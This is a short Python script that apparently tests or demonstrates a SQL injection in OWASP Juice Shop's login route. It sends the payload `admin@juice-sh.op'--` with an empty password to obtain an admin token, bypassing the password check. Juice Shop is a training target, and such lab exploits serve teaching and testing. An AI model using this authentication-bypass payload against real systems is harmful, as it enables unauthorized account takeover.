"""SQL injection in the raw login query of routes/login.ts.

Same payload as Juice Shop's own API test ("login with known email
admin@juice-sh.op in SQL injection attack", test/api/login.test.ts): the email
`admin@juice-sh.op'--` comments out the password check. Success: the server
returns an authentication token for admin without knowing the password.
"""

import json
import urllib.error
import urllib.request


def exploit(base: str) -> tuple[bool, str]:
    payload = json.dumps({"email": "admin@juice-sh.op'--", "password": ""}).encode()
    req = urllib.request.Request(f"{base}/rest/user/login", data=payload,
                                 headers={"content-type": "application/json"})
    try:
        with urllib.request.urlopen(req) as res:
            token = json.load(res).get("authentication", {}).get("token")
        return isinstance(token, str) and len(token) > 0, "got admin token" if token else "no token"
    except urllib.error.HTTPError as err:
        return False, f"HTTP {err.code}"
